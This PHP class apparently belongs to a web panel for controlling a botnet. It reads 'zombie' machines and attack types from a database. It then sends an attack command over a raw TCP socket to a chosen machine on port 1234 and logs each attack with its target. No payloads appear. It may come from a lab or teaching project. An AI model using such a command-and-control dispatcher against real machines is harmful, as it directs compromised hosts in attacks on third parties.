<?php

require_once 'config/connexion.php';


class ModeleAttaque
{
	public function __construct()
	{
	}

    public function getAttaquesZombies()
    {
        $req = Connexion::$bdd->prepare("SELECT attaque_possible from Attaque where est_attaque_zombie = 1 ORDER by attaque_possible");
        $req->execute();
        $result = $req->fetchAll();
        return $result;
    }

    public function getZombies()
    {
        try {
            $req = Connexion::$bdd->prepare("SELECT hostname from Machine where est_on = 1 order by hostname");
            $req->execute();
            $result = $req->fetchAll();
            return $result;
        } catch (PDOException $e) {
        }
    }

    public function getAttaquesVictimes()
    {
        $req = Connexion::$bdd->prepare("SELECT attaque_possible from Attaque where est_attaque_zombie = 0 ORDER by attaque_possible");
        $req->execute();
        $result = $req->fetchAll();
        return $result;
    }

    public function getIP($hostname)
    {
        $req = Connexion::$bdd->prepare("SELECT ip from Machine where hostname = ?");
        $req->execute(array($hostname));
        $result = $req->fetchAll();
        return $result;
    }

    public function getIPs()
    {
        $req = Connexion::$bdd->prepare("SELECT ip from Machine where est_on = 1");
        $req->execute();
        $result = $req->fetchAll();
        return $result;
    }

    public function attaque($attaque, $ip)
    {
        // Création d'un socket TCP/IP
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

        // Connexion au serveur
        $result = socket_connect($socket, $ip, 1234);

        // Envoi de données au serveur
        $message = ($attaque . "\0");
        socket_write($socket, $message, strlen($message));

        // Fermeture de la socket
        socket_close($socket);
    }
    public function enregistrerAttaque($attaque, $ip, $cible, $status_attaque = "FINIE")
    {
        $date_attaque = date("Y/m/d");
        $temps_attaque = date('H:i:s');


        $req = Connexion::$bdd->prepare("SELECT id_attaque from Attaque where attaque_possible = ?");
        $req->execute(array($attaque));
        $result = $req->fetchAll();
        $id_attaque = $result[0][0];

        try {
            $req = Connexion::$bdd->prepare("INSERT INTO historique_attaque (date_attaque, temps_attaque, status_attaque, cible, id_attaque) VALUES (?,?,?,?,?)");
            $req->execute(array($date_attaque, $temps_attaque, $status_attaque, $cible, $id_attaque));     
        } catch (PDOException $e) {
        }


        try {
            $req = Connexion::$bdd->prepare("SELECT id_machine from Machine where ip = ?");
            $req->execute(array($ip));
            $result = $req->fetchAll();
            $id_machine = $result[0][0];
        } catch (PDOException $e) {
        }

        try {
            $req = Connexion::$bdd->prepare("SELECT MAX(id_historique_attaque) from historique_attaque");
            $req->execute();
            $result = $req->fetchAll();
            $id_historique_attaque = $result[0][0];
        } catch (PDOException $e) {
        }

        try {
            $req = Connexion::$bdd->prepare("INSERT INTO attaque_cible (id_machine, id_historique_attaque) VALUES (?,?)");
            $req->execute(array($id_machine, $id_historique_attaque));     
        } catch (PDOException $e) {
        }

    }
    

}